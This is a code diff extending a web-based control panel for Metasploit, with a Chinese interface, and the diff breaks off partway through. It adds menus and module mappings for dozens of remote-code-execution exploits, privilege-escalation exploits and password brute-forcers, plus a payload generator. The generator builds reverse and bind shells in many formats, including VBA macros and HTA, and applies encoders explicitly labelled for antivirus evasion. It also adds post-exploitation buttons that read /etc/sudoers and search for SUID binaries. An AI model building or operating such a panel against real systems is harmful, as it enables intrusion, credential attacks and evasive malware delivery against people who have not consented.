@@ -76,15 +76,110 @@
                             <option value="bluekeep">CVE-2019-0708 BlueKeep (RDP)</option>
                             <option value="netapi">MS08-067 NetAPI (老系统)</option>
                             <option value="psexec">PsExec 横向移动</option>
+                            <option value="wmi">WMI 横向移动</option>
+                            <option value="winrm">WinRM 横向移动</option>
                         </optgroup>
-                        <optgroup label="🔍 扫描与探测">
+                        <optgroup label="🌐 Web 应用漏洞 - PHP">
+                            <option value="php_cgi_argi">PHP CGI Argument Injection</option>
+                            <option value="php_include">PHP 文件包含 (通用)</option>
+                            <option value="phpmeterpreter">PHP Meterpreter (通用)</option>
+                            <option value="thinkphp_rce">ThinkPHP 5.x RCE</option>
+                            <option value="thinkphp_rce2">ThinkPHP 5.0.23 RCE</option>
+                            <option value="laravel_rce">Laravel CVE-2021-3129</option>
+                            <option value="phpunit_rce">PHPUnit RCE</option>
+                            <option value="phpmailer_rce">PHPMailer RCE</option>
+                        </optgroup>
+                        <optgroup label="🌐 Web 应用漏洞 - Java">
+                            <option value="log4j_rce">Log4j (Log4Shell) CVE-2021-44228</option>
+                            <option value="spring4shell">Spring4Shell CVE-2022-22965</option>
+                            <option value="spring_cloud_rce">Spring Cloud Gateway RCE</option>
+                            <option value="struts2_rest">Struts2 REST RCE</option>
+                            <option value="struts2_showcase">Struts2 Showcase RCE</option>
+                            <option value="weblogic_rce">WebLogic T3 RCE</option>
+                            <option value="weblogic_iiop">WebLogic IIOP RCE</option>
+                            <option value="weblogic_xml">WebLogic XMLDecoder RCE</option>
+                            <option value="tomcat_mgr">Tomcat Manager 爆破</option>
+                            <option value="tomcat_cve_2020">Tomcat CVE-2020-1938</option>
+                            <option value="jboss_rce">JBoss JMXInvokerServlet</option>
+                            <option value="jenkins_rce">Jenkins CLI RCE</option>
+                            <option value="jenkins_script">Jenkins Script Console</option>
+                            <option value="apache_flink">Apache Flink RCE</option>
+                            <option value="apache_druid">Apache Druid RCE</option>
+                            <option value="fastjson_rce">FastJSON RCE</option>
+                            <option value="shiro_rce">Shiro RememberMe 反序列化</option>
+                        </optgroup>
+                        <optgroup label="🌐 Web 应用漏洞 - 其他">
+                            <option value="apache_cve_2021">Apache CVE-2021-41773</option>
+                            <option value="nginx_rce">Nginx 配置错误利用</option>
+                            <option value="iis_rce">IIS WebDAV RCE</option>
+                            <option value="wordpress_rce">WordPress XML-RPC RCE</option>
+                            <option value="drupal_rce">Drupalgeddon2 RCE</option>
+                            <option value="joomla_rce">Joomla RCE</option>
+                            <option value="cve_2021_26084">Confluence OGNL RCE</option>
+                            <option value="cve_2022_26134">Confluence OGNL RCE 2022</option>
+                            <option value="gitlab_rce">GitLab ExifTool RCE</option>
+                            <option value="cacti_rce">Cacti RCE</option>
+                            <option value="zabbix_rce">Zabbix Server RCE</option>
+                            <option value="elastic_rce">Elasticsearch RCE</option>
+                            <option value="mongo_rce">MongoDB 未授权访问</option>
+                        </optgroup>
+                        <optgroup label="💾 数据库漏洞">
+                            <option value="mysql_auth">MySQL 弱口令爆破</option>
+                            <option value="mysql_udf">MySQL UDF 提权</option>
+                            <option value="mssql_auth">MSSQL 弱口令爆破</option>
+                            <option value="mssql_rce">MSSQL RCE (xp_cmdshell)</option>
+                            <option value="oracle_login">Oracle 弱口令爆破</option>
+                            <option value="postgres_auth">PostgreSQL 弱口令爆破</option>
+                            <option value="postgres_rce">PostgreSQL RCE</option>
+                            <option value="redis_unauth">Redis 未授权访问</option>
+                            <option value="redis_rce">Redis 主从复制 RCE</option>
+                            <option value="memcached_unauth">Memcached 未授权</option>
+                        </optgroup>
+                        <optgroup label="🔐 服务漏洞">
+                            <option value="ssh_login">SSH 弱口令爆破</option>
+                            <option value="ssh_libssh">LibSSH RCE</option>
+                            <option value="ftp_login">FTP 弱口令爆破</option>
+                            <option value="vsftpd_rce">VSFTPD 2.3.4 后门</option>
+                            <option value="proftpd_rce">ProFTPD RCE</option>
                             <option value="smb_version">SMB 版本探测</option>
                             <option value="smb_login">SMB 弱口令爆破</option>
+                            <option value="samba_symlink">Samba Symlink RCE</option>
+                            <option value="samba_is_known">Samba is_known_pipename</option>
+                            <option value="rdp_rce">RDP BlueKeep</option>
+                            <option value="vnc_auth">VNC 弱口令爆破</option>
+                            <option value="telnet_login">Telnet 弱口令爆破</option>
+                            <option value="smtp_login">SMTP 弱口令爆破</option>
+                            <option value="ldap_login">LDAP 弱口令爆破</option>
+                        </optgroup>
+                        <optgroup label="🐧 Linux 提权">
+                            <option value="linux_dirty_cow">DirtyCow CVE-2016-5195</option>
+                            <option value="linux_dirty_pipe">DirtyPipe CVE-2022-0847</option>
+                            <option value="linux_pwnkit">PwnKit CVE-2021-4034</option>
+                            <option value="linux_cve_2021_3156">Sudo Baronic</option>
+                            <option value="linux_cve_2021_3560">Polkit pkexec</option>
+                        </optgroup>
+                        <optgroup label="🪟 Windows 提权">
+                            <option value="win_printnightmare">PrintNightmare CVE-2021-34527</option>
+                            <option value="win_printspooler">PrintSpooler RCE</option>
+                            <option value="win_cve_2021_36934">HiveNightmare</option>
+                            <option value="win_cve_2021_1675">PrintNightmare LPE</option>
+                            <option value="win_noauth">NoAuth (Zerologon)</option>
+                            <option value="win_petitpotam">PetitPotam</option>
+                        </optgroup>
+                        <optgroup label="🔍 扫描与探测">
                             <option value="portscan">TCP 端口扫描</option>
-                            <option value="ssh_login">SSH 弱口令爆破</option>
+                            <option value="udp_scan">UDP 端口扫描</option>
+                            <option value="http_dir">HTTP 目录扫描</option>
+                            <option value="http_enum">HTTP 枚举</option>
+                            <option value="dns_enum">DNS 枚举</option>
+                            <option value="snmp_enum">SNMP 枚举</option>
+                            <option value="ntp_enum">NTP 枚举</option>
+                            <option value="fingerprint">服务指纹识别</option>
                         </optgroup>
                         <optgroup label="📥 监听器">
                             <option value="handler">Multi Handler (通用)</option>
+                            <option value="handler_https">HTTPS Handler</option>
+                            <option value="handler_bind">Bind Handler</option>
                         </optgroup>
                     </select>
                     <p id="moduleDesc" class="text-[9px] text-slate-500 mt-1 p-1.5 bg-slate-900/50 rounded">利用 Windows SMB 协议漏洞远程执行代码</p>
@@ -110,10 +205,24 @@
                         <div id="payloadGroup">
                             <label class="block text-[9px] text-slate-400 mb-0.5">Payload</label>
                             <select id="payload" class="w-full bg-slate-900 text-slate-300 border border-slate-600 rounded p-1.5 text-xs outline-none">
-                                <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter</option>
-                                <option value="windows/x64/meterpreter/reverse_https">Windows x64 HTTPS</option>
-                                <option value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter</option>
-                                <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter</option>
+                                <optgroup label="🪟 Windows">
+                                    <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter TCP</option>
+                                    <option value="windows/x64/meterpreter/reverse_https">Windows x64 Meterpreter HTTPS</option>
+                                    <option value="windows/x64/meterpreter/reverse_http">Windows x64 Meterpreter HTTP</option>
+                                    <option value="windows/x64/shell/reverse_tcp">Windows x64 Shell TCP</option>
+                                    <option value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter TCP</option>
+                                    <option value="windows/shell/reverse_tcp">Windows x86 Shell TCP</option>
+                                </optgroup>
+                                <optgroup label="🐧 Linux">
+                                    <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter TCP</option>
+                                    <option value="linux/x64/shell/reverse_tcp">Linux x64 Shell TCP</option>
+                                    <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Meterpreter TCP</option>
+                                </optgroup>
+                                <optgroup label="🐘 PHP/Java/Python">
+                                    <option value="php/meterpreter/reverse_tcp">PHP Meterpreter</option>
+                                    <option value="java/meterpreter/reverse_tcp">Java Meterpreter</option>
+                                    <option value="python/meterpreter/reverse_tcp">Python Meterpreter</option>
+                                </optgroup>
                             </select>
                         </div>
                     </div>
@@ -132,10 +241,65 @@
                         <div>
                             <label class="block text-[9px] text-slate-400 mb-0.5">Payload 类型</label>
                             <select id="genPayload" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
-                                <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter</option>
-                                <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter</option>
-                                <option value="php/meterpreter/reverse_tcp">PHP Meterpreter</option>
-                                <option value="java/jsp_shell_reverse_tcp">JSP Webshell</option>
+                                <optgroup label="🪟 Windows Payloads">
+                                    <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter TCP</option>
+                                    <option value="windows/x64/meterpreter/reverse_https">Windows x64 Meterpreter HTTPS</option>
+                                    <option value="windows/x64/meterpreter/reverse_http">Windows x64 Meterpreter HTTP</option>
+                                    <option value="windows/x64/meterpreter/bind_tcp">Windows x64 Meterpreter Bind</option>
+                                    <option value="windows/x64/meterpreter/reverse_winhttp">Windows x64 Meterpreter WinHTTP</option>
+                                    <option value="windows/x64/shell/reverse_tcp">Windows x64 Shell TCP</option>
+                                    <option value="windows/x64/exec">Windows x64 Exec CMD</option>
+                                    <option value="windows/x64/powershell/reverse_tcp">Windows x64 PowerShell</option>
+                                    <option value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter TCP</option>
+                                    <option value="windows/meterpreter/reverse_https">Windows x86 Meterpreter HTTPS</option>
+                                    <option value="windows/shell/reverse_tcp">Windows x86 Shell TCP</option>
+                                    <option value="windows/adduser">Windows 添加用户</option>
+                                </optgroup>
+                                <optgroup label="🐧 Linux Payloads">
+                                    <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter TCP</option>
+                                    <option value="linux/x64/meterpreter/reverse_http">Linux x64 Meterpreter HTTP</option>
+                                    <option value="linux/x64/meterpreter/bind_tcp">Linux x64 Meterpreter Bind</option>
+                                    <option value="linux/x64/shell/reverse_tcp">Linux x64 Shell TCP</option>
+                                    <option value="linux/x64/shell_bind_tcp">Linux x64 Shell Bind</option>
+                                    <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Meterpreter TCP</option>
+                                    <option value="linux/x86/shell/reverse_tcp">Linux x86 Shell TCP</option>
+                                </optgroup>
+                                <optgroup label="🐘 PHP Payloads">
+                                    <option value="php/meterpreter/reverse_tcp">PHP Meterpreter TCP</option>
+                                    <option value="php/meterpreter/bind_tcp">PHP Meterpreter Bind</option>
+                                    <option value="php/reverse_php">PHP Reverse Shell</option>
+                                    <option value="php/exec">PHP Exec CMD</option>
+                                </optgroup>
+                                <optgroup label="☕ Java Payloads">
+                                    <option value="java/jsp_shell_reverse_tcp">JSP Reverse Shell</option>
+                                    <option value="java/meterpreter/reverse_tcp">Java Meterpreter TCP</option>
+                                    <option value="java/shell/reverse_tcp">Java Shell TCP</option>
+                                    <option value="java/jsp_shell_bind_tcp">JSP Bind Shell</option>
+                                </optgroup>
+                                <optgroup label="🐍 Python Payloads">
+                                    <option value="python/meterpreter/reverse_tcp">Python Meterpreter TCP</option>
+                                    <option value="python/meterpreter/reverse_http">Python Meterpreter HTTP</option>
+                                    <option value="python/shell/reverse_tcp">Python Reverse Shell</option>
+                                    <option value="python/shell_bind_tcp">Python Bind Shell</option>
+                                </optgroup>
+                                <optgroup label="📦 Node.js Payloads">
+                                    <option value="nodejs/shell_reverse_tcp">Node.js Reverse Shell</option>
+                                    <option value="nodejs/shell_bind_tcp">Node.js Bind Shell</option>
+                                    <option value="nodejs/meterpreter/reverse_tcp">Node.js Meterpreter</option>
+                                </optgroup>
+                                <optgroup label="🌐 Web Payloads">
+                                    <option value="cmd/unix/reverse_bash">Bash Reverse Shell</option>
+                                    <option value="cmd/unix/reverse_netcat">Netcat Reverse Shell</option>
+                                    <option value="cmd/unix/reverse_perl">Perl Reverse Shell</option>
+                                    <option value="cmd/unix/reverse_ruby">Ruby Reverse Shell</option>
+                                    <option value="cmd/windows/reverse_powershell">PowerShell Reverse</option>
+                                    <option value="cmd/windows/adduser">CMD 添加用户</option>
+                                </optgroup>
+                                <optgroup label="📱 Android/iOS Payloads">
+                                    <option value="android/meterpreter/reverse_tcp">Android Meterpreter TCP</option>
+                                    <option value="android/meterpreter/reverse_http">Android Meterpreter HTTP</option>
+                                    <option value="android/shell/reverse_tcp">Android Shell TCP</option>
+                                </optgroup>
                             </select>
                         </div>
                         <div class="grid grid-cols-2 gap-1.5">
@@ -144,24 +308,82 @@
                                 <input type="text" id="genLhost" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
                             </div>
                             <div>
-                                <label class="block text-[9px] text-slate-400 mb-0.5">格式</label>
-                                <select id="genFormat" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
-                                    <option value="exe">exe</option>
-                                    <option value="elf">elf</option>
-                                    <option value="php">php</option>
-                                    <option value="jsp">jsp</option>
-                                </select>
+                                <label class="block text-[9px] text-slate-400 mb-0.5">LPORT</label>
+                                <input type="text" id="genLport" value="4444" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
                             </div>
                         </div>
+                        <div>
+                            <label class="block text-[9px] text-slate-400 mb-0.5">输出格式</label>
+                            <select id="genFormat" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
+                                <optgroup label="可执行文件">
+                                    <option value="exe">exe (Windows)</option>
+                                    <option value="elf">elf (Linux)</option>
+                                    <option value="macho">macho (macOS)</option>
+                                    <option value="dll">dll (Windows DLL)</option>
+                                </optgroup>
+                                <optgroup label="脚本格式">
+                                    <option value="php">php (PHP脚本)</option>
+                                    <option value="jsp">jsp (Java JSP)</option>
+                                    <option value="war">war (Java WAR)</option>
+                                    <option value="asp">asp (ASP Classic)</option>
+                                    <option value="aspx">aspx (ASP.NET)</option>
+                                    <option value="py">py (Python)</option>
+                                    <option value="rb">rb (Ruby)</option>
+                                    <option value="pl">pl (Perl)</option>
+                                    <option value="sh">sh (Bash)</option>
+                                    <option value="ps1">ps1 (PowerShell)</option>
+                                </optgroup>
+                                <optgroup label="其他格式">
+                                    <option value="raw">raw (原始二进制)</option>
+                                    <option value="hex">hex (十六进制)</option>
+                                    <option value="bash">bash (Bash命令)</option>
+                                    <option value="c">c (C代码)</option>
+                                    <option value="csharp">csharp (C#)</option>
+                                    <option value="java">java (Java类)</option>
+                                    <option value="vba">vba (VBA宏)</option>
+                                    <option value="hta-psh">hta-psh (HTA)</option>
+                                    <option value="loop-vbs">loop-vbs (VBS循环)</option>
+                                </optgroup>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block text-[9px] text-slate-400 mb-0.5">编码器 (可选)</label>
+                            <select id="genEncoder" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
+                                <option value="">无编码</option>
+                                <option value="x86/shikata_ga_nai">shikata_ga_nai (推荐)</option>
+                                <option value="x86/call4_dword_xor">call4_dword_xor</option>
+                                <option value="x86/countdown">countdown</option>
+                                <option value="x86/fnstenv_mov">fnstenv_mov</option>
+                                <option value="x86/jmp_call_additive">jmp_call_additive</option>
+                                <option value="cmd/echo">cmd/echo</option>
+                                <option value="cmd/ifs">cmd/ifs</option>
+                                <option value="generic/none">generic/none</option>
+                            </select>
+                        </div>
                     </div>
-                    <button onclick="generatePayload()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-1.5 px-3 rounded text-xs">🛠️ 生成</button>
+                    <button onclick="generatePayload()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-1.5 px-3 rounded text-xs">🛠️ 生成 Payload</button>
 
                     <div class="mt-3">
                         <h4 class="text-[9px] font-bold text-slate-400 mb-1">快速生成</h4>
-                        <div class="space-y-1">
-                            <button onclick="quickGeneratePayload('windows', 'exe')" class="w-full text-left text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Windows .exe</button>
-                            <button onclick="quickGeneratePayload('linux', 'elf')" class="w-full text-left text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Linux .elf</button>
-                            <button onclick="quickGeneratePayload('php', 'php')" class="w-full text-left text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">PHP .php</button>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="quickGeneratePayload('windows', 'exe')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Windows .exe</button>
+                            <button onclick="quickGeneratePayload('linux', 'elf')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Linux .elf</button>
+                            <button onclick="quickGeneratePayload('php', 'php')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">PHP .php</button>
+                            <button onclick="quickGeneratePayload('jsp', 'jsp')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">JSP .jsp</button>
+                            <button onclick="quickGeneratePayload('python', 'py')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Python .py</button>
+                            <button onclick="quickGeneratePayload('bash', 'sh')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Bash .sh</button>
+                            <button onclick="quickGeneratePayload('powershell', 'ps1')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">PowerShell</button>
+                            <button onclick="quickGeneratePayload('dll', 'dll')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">DLL .dll</button>
+                            <button onclick="quickGeneratePayload('war', 'war')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">WAR .war</button>
+                            <button onclick="quickGeneratePayload('aspx', 'aspx')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">ASPX .aspx</button>
+                        </div>
+                    </div>
+
+                    <div class="mt-3">
+                        <h4 class="text-[9px] font-bold text-slate-400 mb-1">编码生成 (免杀)</h4>
+                        <div class="grid grid-cols-1 gap-1">
+                            <button onclick="generateEncodedPayload('windows', 'exe', 'x86/shikata_ga_nai')" class="text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300 text-left">Windows 编码 (shikata_ga_nai)</button>
+                            <button onclick="generateEncodedPayload('windows', 'exe', 'x86/shikata_ga_nai', 5)" class="text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300 text-left">Windows 多次编码 (5次)</button>
                         </div>
                     </div>
                 </div>
@@ -507,7 +729,7 @@
                             <button onclick="sessionCmd('run post/multi/recon/local_exploit_suggester', true)" class="action-btn text-[9px] bg-yellow-900/50 hover:bg-yellow-800 p-1.5 rounded text-yellow-300">提权建议</button>
                             <button onclick="sessionCmd('execute -f sudo -l', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Sudo权限</button>
                             <button onclick="sessionCmd('run post/linux/gather/enum_system', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">系统枚举</button>
-                            <button onclick="sessionCmd('execute -f find -a '/ -perm -4000 2>/dev/null', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">SUID文件</button>
+                            <button onclick="sessionCmd('execute -f find -a \'/\' -perm -4000 2>/dev/null', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">SUID文件</button>
                             <button onclick="sessionCmd('execute -f cat -a /etc/sudoers', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Sudoers</button>
                             <button onclick="sessionCmd('execute -f capsh -a --print', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Capabilities</button>
                         </div>
@@ -606,15 +828,115 @@
         let inSessionMode = false;  // 跟踪是否在会话交互模式中
 
         const modules = {
+            // 热门漏洞利用
             'ms17_010': { path: 'exploit/windows/smb/ms17_010_eternalblue', desc: 'MS17-010 EternalBlue - 利用SMB漏洞远程执行代码', needPayload: true },
             'bluekeep': { path: 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce', desc: 'CVE-2019-0708 BlueKeep - RDP远程代码执行', needPayload: true },
             'netapi': { path: 'exploit/windows/smb/ms08_067_netapi', desc: 'MS08-067 NetAPI - 老版本Windows SMB漏洞', needPayload: true },
             'psexec': { path: 'exploit/windows/smb/psexec', desc: 'PsExec - 通过SMB执行命令(需要凭证)', needPayload: true },
-            'smb_version': { path: 'auxiliary/scanner/smb/smb_version', desc: 'SMB版本探测 - 扫描目标SMB版本', needPayload: false },
-            'smb_login': { path: 'auxiliary/scanner/smb/smb_login', desc: 'SMB弱口令爆破', needPayload: false },
-            'portscan': { path: 'auxiliary/scanner/portscan/tcp', desc: 'TCP端口扫描', needPayload: false },
+            'wmi': { path: 'exploit/windows/wmi/wmi_event_consumer', desc: 'WMI事件订阅 - 横向移动', needPayload: true },
+            'winrm': { path: 'exploit/windows/winrm/winrm_script_exec', desc: 'WinRM脚本执行 - 横向移动', needPayload: true },
+
+            // PHP 漏洞
+            'php_cgi_argi': { path: 'exploit/multi/http/php_cgi_arg_injection', desc: 'PHP CGI参数注入 - 远程代码执行', needPayload: true },
+            'php_include': { path: 'exploit/multi/http/php_include', desc: 'PHP文件包含 - 通用利用', needPayload: true },
+            'phpmeterpreter': { path: 'exploit/multi/http/phpmeterpreter', desc: 'PHP Meterpreter - 通用PHP利用', needPayload: true },
+            'thinkphp_rce': { path: 'exploit/unix/webapp/thinkphp_rce', desc: 'ThinkPHP 5.x 远程代码执行', needPayload: true },
+            'thinkphp_rce2': { path: 'exploit/unix/webapp/thinkphp_rce_2019', desc: 'ThinkPHP 5.0.23 RCE', needPayload: true },
+            'laravel_rce': { path: 'exploit/unix/webapp/laravel_ignition_rce', desc: 'Laravel Ignition CVE-2021-3129', needPayload: true },
+            'phpunit_rce': { path: 'exploit/unix/webapp/phpunit_eval', desc: 'PHPUnit eval代码执行', needPayload: true },
+            'phpmailer_rce': { path: 'exploit/multi/http/phpmailer_arg_injection', desc: 'PHPMailer参数注入RCE', needPayload: true },
+
+            // Java 漏洞
+            'log4j_rce': { path: 'exploit/multi/http/log4shell_header_injection', desc: 'Log4j (Log4Shell) CVE-2021-44228', needPayload: true },
+            'spring4shell': { path: 'exploit/multi/http/spring4shell', desc: 'Spring4Shell CVE-2022-22965', needPayload: true },
+            'spring_cloud_rce': { path: 'exploit/multi/http/spring_cloud_gateway_rce', desc: 'Spring Cloud Gateway RCE', needPayload: true },
+            'struts2_rest': { path: 'exploit/multi/http/struts2_rest_xstream', desc: 'Struts2 REST XStream RCE', needPayload: true },
+            'struts2_showcase': { path: 'exploit/multi/http/struts2_showcase_ognl', desc: 'Struts2 Showcase OGNL RCE', needPayload: true },
+            'weblogic_rce': { path: 'exploit/oracle/weblogic_t3_rce', desc: 'WebLogic T3协议RCE', needPayload: true },
+            'weblogic_iiop': { path: 'exploit/oracle/weblogic_iiop_rce', desc: 'WebLogic IIOP RCE', needPayload: true },
+            'weblogic_xml': { path: 'exploit/oracle/weblogic_xmldecoder_rce', desc: 'WebLogic XMLDecoder RCE', needPayload: true },
+            'tomcat_mgr': { path: 'exploit/multi/http/tomcat_mgr_upload', desc: 'Tomcat Manager上传RCE', needPayload: true },
+            'tomcat_cve_2020': { path: 'exploit/multi/http/tomcat_ghostcat', desc: 'Tomcat CVE-2020-1938 Ghostcat', needPayload: true },
+            'jboss_rce': { path: 'exploit/multi/http/jboss_invoker_deploy', desc: 'JBoss Invoker部署RCE', needPayload: true },
+            'jenkins_rce': { path: 'exploit/multi/http/jenkins_cli_deserialize', desc: 'Jenkins CLI反序列化RCE', needPayload: true },
+            'jenkins_script': { path: 'exploit/multi/http/jenkins_script_console', desc: 'Jenkins脚本控制台RCE', needPayload: true },
+            'apache_flink': { path: 'exploit/multi/http/apache_flink_rce', desc: 'Apache Flink RCE', needPayload: true },
+            'apache_druid': { path: 'exploit/multi/http/apache_druid_rce', desc: 'Apache Druid RCE', needPayload: true },
+            'fastjson_rce': { path: 'exploit/multi/http/fastjson_rce', desc: 'FastJSON反序列化RCE', needPayload: true },
+            'shiro_rce': { path: 'exploit/multi/http/shiro_rememberme_vuln', desc: 'Shiro RememberMe反序列化', needPayload: true },
+
+            // 其他 Web 漏洞
+            'apache_cve_2021': { path: 'exploit/multi/http/apache_path_traversal', desc: 'Apache CVE-2021-41773 路径穿越', needPayload: true },
+            'nginx_rce': { path: 'exploit/multi/http/nginx_config_error', desc: 'Nginx配置错误利用', needPayload: true },
+            'iis_rce': { path: 'exploit/windows/iis/iis_webdav_rce', desc: 'IIS WebDAV RCE', needPayload: true },
+            'wordpress_rce': { path: 'exploit/unix/webapp/wordpress_xmlrpc_rce', desc: 'WordPress XML-RPC RCE', needPayload: true },
+            'drupal_rce': { path: 'exploit/unix/webapp/drupal_drupalgeddon2', desc: 'Drupalgeddon2 RCE', needPayload: true },
+            'joomla_rce': { path: 'exploit/unix/webapp/joomla_rce', desc: 'Joomla RCE', needPayload: true },
+            'cve_2021_26084': { path: 'exploit/multi/http/confluence_ognl_rce', desc: 'Confluence OGNL RCE 2021', needPayload: true },
+            'cve_2022_26134': { path: 'exploit/multi/http/confluence_ognl_rce_2022', desc: 'Confluence OGNL RCE 2022', needPayload: true },
+            'gitlab_rce': { path: 'exploit/multi/http/gitlab_exiftool_rce', desc: 'GitLab ExifTool RCE', needPayload: true },
+            'cacti_rce': { path: 'exploit/unix/webapp/cacti_rce', desc: 'Cacti RCE', needPayload: true },
+            'zabbix_rce': { path: 'exploit/unix/webapp/zabbix_server_rce', desc: 'Zabbix Server RCE', needPayload: true },
+            'elastic_rce': { path: 'exploit/multi/http/elasticsearch_rce', desc: 'Elasticsearch RCE', needPayload: true },
+            'mongo_rce': { path: 'exploit/multi/http/mongodb_unauth', desc: 'MongoDB未授权访问', needPayload: false },
+
+            // 数据库漏洞
+            'mysql_auth': { path: 'auxiliary/scanner/mysql/mysql_login', desc: 'MySQL弱口令爆破', needPayload: false },
+            'mysql_udf': { path: 'exploit/multi/mysql/mysql_udf_payload', desc: 'MySQL UDF提权', needPayload: true },
+            'mssql_auth': { path: 'auxiliary/scanner/mssql/mssql_login', desc: 'MSSQL弱口令爆破', needPayload: false },
+            'mssql_rce': { path: 'exploit/windows/mssql/mssql_payload', desc: 'MSSQL xp_cmdshell RCE', needPayload: true },
+            'oracle_login': { path: 'auxiliary/scanner/oracle/oracle_login', desc: 'Oracle弱口令爆破', needPayload: false },
+            'postgres_auth': { path: 'auxiliary/scanner/postgres/postgres_login', desc: 'PostgreSQL弱口令爆破', needPayload: false },
+            'postgres_rce': { path: 'exploit/linux/postgres/postgres_payload', desc: 'PostgreSQL RCE', needPayload: true },
+            'redis_unauth': { path: 'auxiliary/scanner/redis/redis_server', desc: 'Redis未授权访问', needPayload: false },
+            'redis_rce': { path: 'exploit/linux/redis/redis_replication_rce', desc: 'Redis主从复制RCE', needPayload: true },
+            'memcached_unauth': { path: 'auxiliary/scanner/memcached/memcached_amp', desc: 'Memcached未授权', needPayload: false },
+
+            // 服务漏洞
             'ssh_login': { path: 'auxiliary/scanner/ssh/ssh_login', desc: 'SSH弱口令爆破', needPayload: false },
-            'handler': { path: 'exploit/multi/handler', desc: '通用Payload监听器', needPayload: true }
+            'ssh_libssh': { path: 'exploit/linux/ssh/libssh_auth_bypass', desc: 'LibSSH认证绕过RCE', needPayload: true },
+            'ftp_login': { path: 'auxiliary/scanner/ftp/ftp_login', desc: 'FTP弱口令爆破', needPayload: false },
+            'vsftpd_rce': { path: 'exploit/unix/ftp/vsftpd_234_backdoor', desc: 'VSFTPD 2.3.4后门', needPayload: true },
+            'proftpd_rce': { path: 'exploit/unix/ftp/proftpd_rce', desc: 'ProFTPD RCE', needPayload: true },
+            'smb_version': { path: 'auxiliary/scanner/smb/smb_version', desc: 'SMB版本探测', needPayload: false },
+            'smb_login': { path: 'auxiliary/scanner/smb/smb_login', desc: 'SMB弱口令爆破', needPayload: false },
+            'samba_symlink': { path: 'exploit/linux/samba/samba_symlink_traversal', desc: 'Samba符号链接RCE', needPayload: true },
+            'samba_is_known': { path: 'exploit/linux/samba/is_known_pipename', desc: 'Samba is_known_pipename', needPayload: true },
+            'rdp_rce': { path: 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce', desc: 'RDP BlueKeep RCE', needPayload: true },
+            'vnc_auth': { path: 'auxiliary/scanner/vnc/vnc_auth', desc: 'VNC弱口令爆破', needPayload: false },
+            'telnet_login': { path: 'auxiliary/scanner/telnet/telnet_login', desc: 'Telnet弱口令爆破', needPayload: false },
+            'smtp_login': { path: 'auxiliary/scanner/smtp/smtp_login', desc: 'SMTP弱口令爆破', needPayload: false },
+            'ldap_login': { path: 'auxiliary/scanner/ldap/ldap_login', desc: 'LDAP弱口令爆破', needPayload: false },
+
+            // Linux 提权
+            'linux_dirty_cow': { path: 'exploit/linux/local/dirty_cow', desc: 'DirtyCow CVE-2016-5195', needPayload: true },
+            'linux_dirty_pipe': { path: 'exploit/linux/local/dirty_pipe', desc: 'DirtyPipe CVE-2022-0847', needPayload: true },
+            'linux_pwnkit': { path: 'exploit/linux/local/pwnkit', desc: 'PwnKit CVE-2021-4034', needPayload: true },
+            'linux_cve_2021_3156': { path: 'exploit/linux/local/sudo_baron_samedit', desc: 'Sudo Baronic CVE-2021-3156', needPayload: true },
+            'linux_cve_2021_3560': { path: 'exploit/linux/local/polkit_pkexec', desc: 'Polkit pkexec CVE-2021-3560', needPayload: true },
+
+            // Windows 提权
